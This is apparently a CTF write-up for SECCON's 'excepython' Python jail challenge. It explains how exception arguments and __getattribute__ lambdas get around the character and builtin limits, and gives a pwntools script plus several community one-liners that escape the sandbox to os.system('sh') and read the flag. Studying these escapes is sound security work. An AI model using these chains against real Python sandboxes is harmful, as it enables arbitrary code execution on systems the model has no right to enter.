# excepython

Attachment:

```python
#!/usr/local/bin/python3
ex = None
while (code := input("jail> ")) and all(code.count(c) <= 1 for c in ".,(+)"):
    try:
        eval(code, {"__builtins__": {}, "ex": ex})
    except Exception as e:
        ex = e
        print(type(ex), repr(ex.args))
```

Requirements:

1. At most one occurrence for each character `.,(+)`: use lambda + `__getattribute__` for `a.b`, call function step by step, save intermediate values in exception `KeyError` via `{}[obj]`
2. No builtins: use `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`

First, we need to know how to save data into exception. There are two ways I found:

```python
# KeyError
>>> try:
...     {}[123]
... except Exception as e:
...     print(e.args)
...
(123,)
# AttributeError
>>> try:
...     object.zzz
... except Exception as e:
...     print(e.obj)
...
<class 'object'>
```

The first way has its limitations: the argument type cannot be list, otherwise the error will change and we can no longer maintain the object we want:

```python
>>> try:
...     {}[[1]]
... except Exception as e:
...     print(type(e))
...     print(e.args)
... 
<class 'TypeError'>
("unhashable type: 'list'",)
```

The second way consumes one `.`, which is not suitable for this challenge: we need an extra `.` in `ex.args` to access the object we saved, but we cannot use another one to save object to `ex`. So we have to use the first way to save object.

Next, the problem is, how to access attributes? The vanilla `a.b` consumes one `.`, which is not feasible. We used the method from [jailCTF 2025 one](../misc/pyjail/jailctf-2025-one.md):

```python
lambda x,*y: x.__getattribute__(*y))
```

However, it consumes `,`. We change it to:

```python
lambda x: x[0].__getattribute__(*x[1:])
```

Next, we can follow the similar process of [jailCTF 2025 one](../misc/pyjail/jailctf-2025-one.md) to get `class object`:

```python
try:
    {}[g := lambda x: x[0].__getattribute__(*x[1:])]
except Exception as e:
    print(type(e))
    print(repr(e.args))

    try:
        # [].__setattr__
        {}[g := e.args[0], g([[]] + ["__setattr__"])]
    except Exception as e:
        print(type(e))
        print(repr(e.args))

        try:
            # [].__setattr__.__objclass__
            {}[g := e.args[0], g[0]([g[1]] + ["__objclass__"])]
        except Exception as e:
            print(type(e))
            print(repr(e.args))
```

At this point, we need to pass three arguments (`[object, object, "__subclasses__"]` corresponding to `object.__getattribute__(object, "__subclasses__")`) to the `__getattribute__` lambda, to access `[].__setattr__.__objclass__.__subclasses__`. However, at this time, I did not find a way to do this. So, I went for another chain to access builtins: `[].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")`:

```python
try:
    {}[g := lambda x: x[0].__getattribute__(*x[1:])]
except Exception as ex:
    print(type(ex))
    print(repr(ex.args[0]))

    try:
        # [].__reduce_ex__
        {}[g := ex.args[0], g([[]] + ["__reduce_ex__"])]
    except Exception as ex:
        print(type(ex))
        print(repr(ex.args[0]))

        try:
            # [].__reduce_ex__(2)[0]
            {}[g := ex.args[0], g[1](2)[0]]
        except Exception as ex:
            print(type(ex))
            print(repr(ex.args[0]))

            try:
                # [].__reduce_ex__(2)[0].__builtins__["__import__"]
                {}[g := ex.args[0], g[0][0]([g[1]] + ["__builtins__"])["__import__"]]
            except Exception as ex:
                print(type(ex))
                print(repr(ex.args[0]))

                try:
                    # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os")
                    {}[g := ex.args[0], g[1]("os")]
                except Exception as ex:
                    print(type(ex))
                    print(repr(ex.args[0]))

                    try:
                        # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system
                        {}[g := ex.args[0], g[0][0][0][0]([g[1]] + ["system"])]
                    except Exception as ex:
                        print(type(ex))
                        print(repr(ex.args[0]))

                        try:
                            # [].__reduce_ex__(2)[0].__builtins__["__import__"]("os").system("sh")
                            {}[g := ex.args[0], g[1]("sh")]
                        except Exception as ex:
                            print(type(ex))
                            print(repr(ex.args[0]))
```

However, when I port the attack to the jail environment, it always fails with missing `__import__` when running `__reduce_ex__`. Weird. So I had to return to the chain of `[].__setattr__.__objclass__.__subclasses__()[os_wrap_close_index].__init__.__globals__["system"]("sh")`, which required calling `a.__getattribute__(a, c)`: I used another lambda `g := lambda x: f([x[0]]+x)` where `f := lambda x: x[0].__getattribute__(*x[1:])` to achieve this:

```python
ex = None
try:
    {}[f := lambda x: x[0].__getattribute__(*x[1:])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    {}[f := ex.args[0], g := lambda x: f([x[0]]+x)]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__
    {}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__
    {}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__
    {}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # index of os._wrap_close can be found via: print(str(object.__subclasses__()).split(', ').index("<class 'os._wrap_close'>"))
    # [].__setattr__.__objclass__.__subclasses__()[166]
    {}[g := ex.args[0], g[1]()[166]]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__()[166].__init__
    {}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__()[166].__init__.__globals__["system"]
    {}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))

try:
    # [].__setattr__.__objclass__.__subclasses__()[166].__init__.__globals__["system"]("sh")
    {}[g := ex.args[0], g[1]("sh")]
except Exception as e:
    ex = e
    print(type(e))
    print(repr(e.args[0]))
```

Now, change the os_wrap_close_index from 166 to 167 (find via `print(str(object.__subclasses__()).split(', ').index("<class 'os._wrap_close'>"))` in Python 3.14 in Docker) to match remote, and run the attack script to get shell:

```python
from pwn import *

context(log_level="DEBUG")

io = remote("excepython.seccon.games", 5000)

# attack chain:
# [].__setattr__.__objclass__.__subclasses__()[167].__init__.__globals__["system"]("sh")
io.recvuntil(b"jail>")
io.sendline(b"{}[f := lambda x: x[0].__getattribute__(*x[1:])]")
io.recvuntil(b"jail>")
io.sendline(b"{}[f := ex.args[0], g := lambda x: f([x[0]]+x)]")
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args, g[0][0]([[]] + ["__setattr__"])]')
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0]([g[1]] + ["__objclass__"])]')
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0][1]([g[1]] + ["__subclasses__"])]')
io.recvuntil(b"jail>")
io.sendline(b"{}[g := ex.args[0], g[1]()[167]]")
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[0][0][0][0][0][1]([g[1]] + ["__init__"])]')
io.recvuntil(b"jail>")
io.sendline(
    b'{}[g := ex.args[0], g[0][0][0][0][0][0][0]([g[1]] + ["__globals__"])["system"]]'
)
io.recvuntil(b"jail>")
io.sendline(b'{}[g := ex.args[0], g[1]("sh")]')

# cat /flag*
# SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
io.interactive()
```

Solutions on Discord:

Idea: use `\x2e` + `format` to bypass the limitation, use `AttributeError` to save object to `ex`.

@HexF:

```python
x
'{0\x2e__traceback__\x2etb_frame\x2ef_globals[__builtins__]\x2eexec\x2ea}'.format(ex)
ex.obj('\x65\x78\x2e\x5f\x5f\x74\x72\x61\x63\x65\x62\x61\x63\x6b\x5f\x5f\x2e\x74\x62\x5f\x66\x72\x61\x6d\x65\x2e\x66\x5f\x67\x6c\x6f\x62\x61\x6c\x73\x5b\x22\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f\x22\x5d\x2e\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f\x28\x22\x6f\x73\x22\x29\x2e\x73\x79\x73\x74\x65\x6d\x28\x22\x63\x61\x74\x20\x2f\x66\x6c\x61\x67\x2a\x22\x29')
```

@Peter:

```python
1/0
'{0\x2e__traceback__\x2etb_frame\x2ef_builtins\x2e__nosuch__}'.format(ex)
'{0\x2eobj[__import__]\x2e__nosuch__}'.format(ex)
{}[ex.obj('os')]
'{0\x2eargs[0]\x2esystem\x2e__nosuch__}'.format(ex)
ex.obj('cat /flag-*')
```

@nikost:

```python
1/0
"{0\x2e__class__\x2e__mro__[4]\x2e__subclasses__\x2epouet}".format(ex)
[[ex := ex.obj()[167]] for i in '12']
"{0\x2eobj\x2e__init__\x2e__builtins__[__import__]\x2epouet}".format(ex)
[[ex := ex.obj('os') for i in '12']]
"{0\x2eobj\x2esystem\x2epouet}".format(ex)
ex.obj('/bin/bash')
cat ../flag*
```

@D1N0:

```python
1/0
[[[ex:=[ex["eval"] if idx=="d" else ex.__getattribute__][0](x)][0] for x in ["__traceback__" if idx == "a" else "tb_frame" if idx=="b" else "f_builtins" if idx=="c" else "ex['__import__']\x28'os'\x29\x2esystem\x28'cat /flag*'\x29"]][0] for idx in "abcd"]
```

A similar solution to mime by @huongnoi100%:

```python
jail> {}[lambda d:[*d][0].__getattribute__(d[[*d][0]]),0]
{}[ex.args[0][0],ex]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__traceback__'})]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'tb_frame'})]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'f_globals'})['__builtins__']]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'__import__'})]
{}[[s:=ex.args[0]] and s[0],s[1]('os')]
{}[[s:=ex.args[0]] and s[0],s[0]({s[1]:'system'})]
{}[[s:=ex.args[0]] and s[0],s[1]('cat /flag-*')]
jail> jail> jail> jail> jail> jail> jail> jail> SECCON{Pyth0n_was_m4de_for_jail_cha1lenges}
```
